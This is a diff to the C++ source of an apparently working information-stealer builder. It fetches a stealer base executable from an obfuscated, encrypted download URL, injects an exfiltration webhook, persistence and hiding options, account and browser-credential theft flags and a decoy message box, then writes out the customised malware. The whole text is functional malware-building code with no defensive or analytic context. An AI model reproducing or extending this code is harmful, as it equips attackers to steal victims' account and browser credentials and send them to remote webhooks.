@@ -21,7 +21,7 @@ bool VerifyLicense(string License);
 int DownloadFile(string url, string path);
 string decrypt2(string toEncrypt);
 
-// command syntax: [ID]==[WebHook_URL]==[Path]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]==
+// command syntax: [ID]==[WebHook_URL]==[Path]==[AAP-Data]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]==[Title]==[Message]==
 // ID has to be 8 chars
 // ID has to be combined with HWID. Example: [ID{HWID}]
 
@@ -59,7 +59,7 @@ int main(int argc, char* argv[])
 			return 0;
 		}
 	}
-	if (CMDParts.size() == 4)
+	if (CMDParts.size() == 7)
 	{
 		string RawID = CMDParts[0];
 		size_t EndID = RawID.find("]");
@@ -72,7 +72,7 @@ int main(int argc, char* argv[])
 			string WebHook = decrypt(RemovedBracketsWB);
 			string tempPath = getenv("TEMP");
 			string StealerBase = tempPath + "\\StealerBase.exe";
-			DownloadFile(decrypt("uggcf://pqa.qvfpbeqncc.pbz/nggnpuzragf/755908849738842196/762063832163155978/ZnvaFgrnyreOnfrPCC.rkr"), StealerBase);
+			DownloadFile(DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu&ey*99Q2")), StealerBase);
 			ifstream MyFile(StealerBase, std::ios::binary);
 			string AllBytes = string((istreambuf_iterator<char>(MyFile)),
 				(istreambuf_iterator<char>()));
@@ -80,14 +80,35 @@ int main(int argc, char* argv[])
 			size_t DummyLicenseLocation = AllBytes.find(DummyLicense);
 			AllBytes.replace(DummyLicenseLocation, DummyLicense.length(), decrypt(License));
 			string DummyText = "[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]";
+			string DummyText2 = "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>";
 			size_t DummyTextLocation = AllBytes.find(DummyText);
+			size_t DummyText2Location = AllBytes.find(DummyText2);
 			AllBytes.replace(DummyTextLocation, WebHook.length(), WebHook);
+			AllBytes.replace(DummyText2Location, WebHook.length(), WebHook);
 			string RawLocation = CMDParts[2];
-			string Features = CMDParts[3];
-			string DummyFeatures = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]";
+			string AAPData = CMDParts[3];
+			string DummyAAP = "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}";
+			size_t DummyAAPLocation = AllBytes.find(DummyAAP);
+			AllBytes.replace(DummyAAPLocation, AAPData.length(), AAPData);
+			string Features = CMDParts[4];
+			string DummyFeatures = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
 			size_t DummyFeaturesLocation = AllBytes.find(DummyFeatures);
 			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), Features);
 			string Location = RawLocation.substr(1, RawLocation.size() - 2);
+
+			//Message Box
+			string MessageTitle = CMDParts[5];
+			MessageTitle = MessageTitle.substr(1, MessageTitle.size() - 2);
+			string DummyTitle = "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-";
+			size_t DummyTitleLocation = AllBytes.find(DummyTitle);
+			AllBytes.replace(DummyTitleLocation, MessageTitle.length(), MessageTitle);
+			string Message = CMDParts[6];
+			Message = Message.substr(1, Message.size() - 2);
+			string DummyMessage = "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-";
+			size_t DummyMessageLocation = AllBytes.find(DummyMessage);
+			AllBytes.replace(DummyMessageLocation, Message.length(), Message);
+			// Message Box - End
+
 			ofstream WriteFile(Location, std::ofstream::trunc | std::ios::binary);
 			WriteFile << AllBytes;
 			remove(StealerBase.c_str());
